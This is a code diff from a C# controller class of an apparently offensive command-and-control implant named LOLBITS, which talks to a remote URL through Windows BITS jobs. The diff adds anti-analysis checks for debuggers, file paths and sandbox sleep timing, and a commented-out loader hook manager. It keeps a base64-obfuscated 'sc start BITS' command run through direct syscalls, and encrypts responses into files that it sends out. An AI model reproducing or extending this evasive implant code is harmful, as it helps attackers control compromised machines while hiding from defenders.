@@ -22,16 +22,17 @@ namespace LOLBITS.Controlling
         private readonly string _tempPath;
         private readonly TokenManager _tokenManager;
         private readonly Jobs _jobsManager;
+       // private readonly HookManager _hookManager;
         private readonly SysCallManager _sysCall;
 
         public Controller(string id, string url,string password)
         {
             _id = id;
             _p = password;
-            _jobsManager = new Jobs(url);
             _sysCall = new SysCallManager();
             _tokenManager = new TokenManager(_sysCall);
-
+           // _hookManager = new HookManager(_sysCall);
+            _jobsManager = new Jobs(url);
             _tempPath = Environment.GetEnvironmentVariable("temp") ?? @"C:\Windows\Temp\";
         }
 
@@ -40,9 +41,20 @@ namespace LOLBITS.Controlling
             return _p;
         }
 
+        public bool areWeSafe()
+        {
+            return Protection.Debugging.areWeSafe() &&
+                   Protection.Filepath.areWeSafe() &&
+                   Protection.Sleepy.areWeSafe();
+        }
+
+       /* public void hookLdr()
+        {
+            _hookManager.Install();
+        }*/
+
         public void Start()
         {
-
             string startBits = Encoding.UTF8.GetString(Convert.FromBase64String("c2Mgc3RhcnQgQklUUw=="));
             Utils.ExecuteCommand(startBits, _sysCall);
             Thread.Sleep(500);
@@ -326,7 +338,7 @@ namespace LOLBITS.Controlling
             EncryptResponseIntoFile(filePath, response);
             TrySend(filePath);
         }
-      
+
         private  string GetProcessInfo()
         {
             var output = "\n";
